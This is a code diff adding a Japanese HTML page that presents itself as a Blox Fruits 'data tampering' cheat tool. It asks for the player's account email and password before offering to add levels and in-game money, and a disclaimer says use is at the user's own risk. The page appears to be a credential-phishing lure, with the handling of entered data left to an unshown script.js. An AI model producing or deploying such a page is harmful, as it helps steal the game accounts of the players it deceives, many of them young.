@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>BloxFruits 情報改竄ツール</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background: url('https://tr.rbxcdn.com/180DAY-7c0f003999e63b831af53f2ea454191b/768/432/Image/Webp/noFilter') center/cover no-repeat fixed;
+      font-family: 'Segoe UI', sans-serif;
+    }
+    .glass {
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+    }
+    .fade-in {
+      animation: fadeIn 1s ease-out forwards;
+      opacity: 0;
+    }
+    @keyframes fadeIn {
+      to {
+        opacity: 1;
+      }
+    }
+    .flicker {
+      animation: flicker 1s infinite alternate;
+    }
+    @keyframes flicker {
+      0% { opacity: 1; }
+      100% { opacity: 0.7; }
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4 text-white space-y-8">
+
+  <div class="text-center space-y-2 glass px-6 py-4 rounded-xl">
+    <canvas id="canvas" width="640" height="160" class="hidden rounded-xl"></canvas>
+  </div>
+
+  <div class="glass rounded-3xl shadow-2xl p-8 w-full max-w-xl space-y-8 fade-in">
+    <div class="text-center space-y-2">
+      <h1 class="text-4xl font-extrabold text-blue-400 drop-shadow-md flicker">
+        BloxFruits 情報改竄ツール
+      </h1>
+    </div>
+
+    <form id="account-form" class="space-y-4 transition-all duration-700">
+      <input id="username" placeholder="mailaddress" class="w-full px-4 py-3 rounded-lg bg-gray-900 bg-opacity-70 focus:ring-2 focus:ring-blue-400 border border-blue-800 placeholder-gray-400" required />
+      <input id="password" type="password" placeholder="password" class="w-full px-4 py-3 rounded-lg bg-gray-900 bg-opacity-70 focus:ring-2 focus:ring-blue-400 border border-blue-800 placeholder-gray-400" required />
+      <button type="submit" class="w-full py-3 bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-indigo-500 hover:to-blue-600 rounded-lg font-bold shadow-lg transition">次へ</button>
+    </form>
+
+    <form id="boost-form" class="space-y-4 hidden transition-all duration-700">
+      <div class="grid grid-cols-2 gap-4">
+        <input id="level-amount" type="number" min="1" placeholder="増やしたいレベル数" class="px-4 py-3 rounded-lg bg-gray-900 bg-opacity-70 focus:ring-2 focus:ring-green-400 border border-green-700 placeholder-gray-400" required />
+        <input id="money-amount" type="number" min="1" placeholder="増やしたい金額" class="px-4 py-3 rounded-lg bg-gray-900 bg-opacity-70 focus:ring-2 focus:ring-yellow-400 border border-yellow-700 placeholder-gray-400" required />
+      </div>
+      <button type="submit" class="w-full py-3 bg-gradient-to-r from-green-500 to-yellow-500 hover:from-yellow-500 hover:to-green-500 rounded-lg font-bold shadow-lg transition">送信</button>
+    </form>
+
+    <div id="log" class="hidden bg-black bg-opacity-70 text-green-400 font-mono text-sm rounded-lg p-4 h-48 overflow-y-auto whitespace-pre-line border border-green-700 shadow-inner"></div>
+  </div>
+
+  <script src="script.js"></script>
+  <div style="position: fixed; bottom: 8px; right: 12px; font-size: 10px; color: red; opacity: 0.7; z-index: 50;">
+    ※ツールの使用は自己責任です。
+  </div>
+</body>
+</html>
